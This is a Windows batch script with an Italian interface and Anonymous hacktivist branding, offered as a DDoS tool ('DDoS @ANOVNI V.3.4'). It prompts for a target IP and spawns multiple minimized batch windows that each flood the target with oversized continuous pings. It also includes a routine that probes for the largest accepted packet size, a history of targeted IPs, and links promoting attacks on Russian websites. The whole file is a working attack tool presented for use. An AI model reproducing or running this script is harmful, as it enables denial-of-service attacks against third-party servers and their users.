mode CON: cols=89 LINES=22
title DDoS @ANOVNI                                                                                                          V.3.4

set "DIR=C:\Users\%username%\AppData\Local\Temp\DDoS"

if exist %DIR% goto skipmd
md %DIR%

:skipmd
cd %DIR%
goto init

:start
set "o= "
DEL /F /Q /S *.bat *.dat
color a
@echo off
cls

echo.
echo   ллллллЛ ллллллЛ  ллллллЛ лллллллЛ    NOI SIAMO ANONYMOUS
echo   ллЩЭЭллЛллЩЭЭллЛллЩЭЭЭллЛллЩЭЭЭЭМ    NOI SIAMO LEGIONE
echo   ллК  ллКллК  ллКллК   ллКлллллллЛ    NOI NON DIMENTICHIAMO
echo   ллК  ллКллК  ллКллК   ллКШЭЭЭЭллК    NOI NON PERDONIAMO
echo   ллллллЩМллллллЩМШллллллЩМлллллллК    ASPETTACI
echo   ШЭЭЭЭЭМ ШЭЭЭЭЭМ  ШЭЭЭЭЭМ ШЭЭЭЭЭЭМ    AnonFamily @anovni
echo.

call :color 0 " "
call :color 2f "Digita"
call :color a " "Home"  "
call :color f "---- "
call :color a "Twitter @anovni1     "    
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Digita"
call :color a " "List"  "
call :color f "---- "
call :color a "Per visualizzare gli IP recenti che hai inserito" & echo.
echo.
call :color 0 " "
call :color 2f "Digita"
call :color a " "Squad303" "
call :color f "---- "
call :color a "OpRussia-Noi, i popoli del mondo, abbiamo un messaggio per la nazione russa.                               "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Digita"
call :color a " "FckPutin" "
call :color f "---- "
call :color a "OpRussia-Attacca tutti siti web Russi -DDoS Online Tool                              "
call :color cf "[Website]" & echo.
echo.

call :color 0 " "
call :color 2f "Digita"
call :color a " "Anonymous" "
call :color f "---- "
call :color a "248 Termux-Tool Hacking GitHub                              "
call :color cf "[Website]" & echo.
echo.

call :color 0 " "
call :color 2f "Digita"
call :color a " "Server "
call :color f " ---- "
call :color a "Per ottenere l'IP di un sito Web" & echo.
echo.
call :color 0 " "
call :color 2f "Digita"
call :color a " "Track" "
call :color f "---- "
call :color a "Per tenere traccia dell'IP di qualcuno                                        "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Digita"
call :color a " "Help" "
call :color f " ---- "
call :color a "Per la pagina di aiuto                                        " & echo.
echo.
set /p ip= Scelta / IP da attaccare:
if %ip%==Squad303 goto get
if %ip%==squad303 goto get
if %ip%==SQUAD303 goto get
if %ip%==FckPutin goto fck
if %ip%==fckputin goto fck
if %ip%==FCKPUTIN goto fck
if %ip%==Anonymous goto anon
if %ip%==anonymous goto anon
if %ip%==ANONYMOUS goto anon
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==HOME goto home
if %ip%==home goto home
if %ip%==Home goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Convalida IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Controlla il nome e riprova." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)
:validip2
>nul find "Host di destinazione non raggiungibile." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip3
)
:validip3
>nul find "Timeout della richiesta." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip4
)
:validip4
>nul find "PING: trasmissione non riuscita. Errore generale." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> %DIR%\history.log
echo  %date%             IP: %ip%   >> %DIR%\history.log
call :color f "                                   "
call :color a0 " - L'IP ш valido - " & echo.
call :color 0 " "
call :color 2f "Pacco:"
call :color 0a " 32 - 15000                                               "
call :color 2f "Piu grande e', meglio e"
call :color 0a "                                                                                             "
call :color 9f "F) Rileva pacchetto"
call :color a "                                                               E) Indietro" & echo.
echo.
set /p package= Pacchetto: 
if %package%==f goto find
if %package%==F goto find
if %package%==e goto start
if %package%==E goto start
if %package%==%package% goto pack

:pack
echo exit >> %DIR%\info.bat
echo title DDoS Assistance     >> %DIR%\DDoS-Assistance.bat
echo ping %ip% -t -l %package% >>%DIR%\DDoS-Assistance.bat
set "launch=1"

:ddoslauncher
start /min %DIR%\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto lmao
goto ddoslauncher


:server
color f
cls
echo.
call :color 28 "   Se hai una luce"
call :color 28 "                                                            E) Indietro "
call :color 28 "   Velocita' di rete che puoi                                                            "  
call :color 28 "   Rimuovi un sito web                                                              " 
call :color 28 "   In caso contrario, lo farai                                                             " 
call :color 28 "   Non utilizzare questa funzione                                                     " 
echo.
set /p trace=url: 
if %trace%==e goto start
if "%trace%"=="%trace%" goto trace

:trace
color a
tracert %trace%
echo.
echo    -- IP su questo testo --
echo     Copialo se vuoi
echo.
pause
goto start


:help
echo.
call :color a " " 
call :color cf "[+]" 
call :color a " Come scegliere come target un IP" & echo.
call :color b "                     Inserisci l'IP che vuoi DDoS nell'area" & echo.
echo                               "Scelta/ IP da attaccare:" 
echo.
call :color a " Premere "
call :color e "Invio"
call :color a " Per tornare
set /p nul=
goto start


:home
start https://twitter.com/ANOVNI1
goto start

:get
start https://1920.in
goto start

:fck
start  https://CyberWar.cz/FckPutler/ExpectUS.html
goto start

:anon
start https://github.com/topics/termux-tool
goto start

:track
start http://www.ip-tracker.org/
goto start

:lmao
cls
echo.
ping %IP% -t -l %package% 
exit


:list
cls
if exist %DIR%\history.log type %DIR%\history.log
echo.
echo.
echo  C)Cancella                  E)Indietro
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start
:clear
del %DIR%\history.log
goto start


:find
cls
set /a package=11000
echo title Package Detector     >> %DIR%\Package-Detector.bat
echo :beginning                 >> %DIR%\Package-Detector.bat
echo if exist %DIR%\info.bat call %DIR%\info.bat >> %DIR%\Package-Detector.bat
echo goto beginning             >> %DIR%\Package-Detector.bat
set "launch=1"


:launcher
start /min %DIR%\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher


:resetfind
if exist %DIR%\info.bat del %DIR%\info.bat
set /a package=%package% - 1000
if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> %DIR%\info.bat
if exist %DIR%\text.dat del %DIR%\text.dat
ping %ip% -l %package% -t -n 2 >> %DIR%\text.dat -n 2
>nul find "Request timed out." %DIR%\text.dat && (
  goto resetfind
) || (
  goto pack
)


:invalidip
call :color c "                                 - IP non esiste -" & echo.
ping localhost -n 2 >NUL
goto start

:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start


:color
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"